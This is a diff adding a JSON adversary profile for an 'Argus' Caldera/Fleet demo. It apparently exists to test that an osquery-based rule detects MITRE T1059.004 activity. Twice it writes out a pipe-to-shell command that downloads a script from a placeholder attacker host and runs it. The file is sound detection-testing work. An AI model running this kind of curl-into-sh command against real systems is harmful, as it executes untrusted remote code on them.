@@ -1,0 +1,29 @@
+{
+  "difficulty_level": 1,
+  "name": "argus-linux-e2e-demo",
+  "adversary_id": "argus-linux-e2e-demo",
+  "group": "all-endpoints",
+  "description": "Argus Fleet/Caldera E2E demo profile. Runs a single Linux pipe-to-shell primitive (curl | sh) against the soc-endpoint-1 sandcat agent to trip the [Argus] Linux pipe-to-shell (T1059.004) rule via osquery_manager telemetry.",
+  "platform": "linux",
+  "techniques": ["T1059.004"],
+  "primitives": [
+    {
+      "id": "argus-linux-pipe-to-shell-primitive",
+      "description": "Pipe-to-shell downloader — curl into sh.",
+      "technique_id": "T1059.004",
+      "command": "bash -c 'curl -sfL http://attacker.local/stage.sh | sh'"
+    }
+  ],
+  "attack_commands": [
+    {
+      "command_id": "argus-e2e-linux-01",
+      "technique_id": "T1059.004",
+      "platform": "linux",
+      "executor": "sh",
+      "command": "bash -c 'curl -sfL http://attacker.local/stage.sh | sh'",
+      "target_group": "all-endpoints",
+      "expected_rule_id": "argus-linux-pipe-to-shell",
+      "notes": "Primitive will fail to resolve attacker.local but osquery captures the cmdline, which is what the rule scores on."
+    }
+  ]
+}
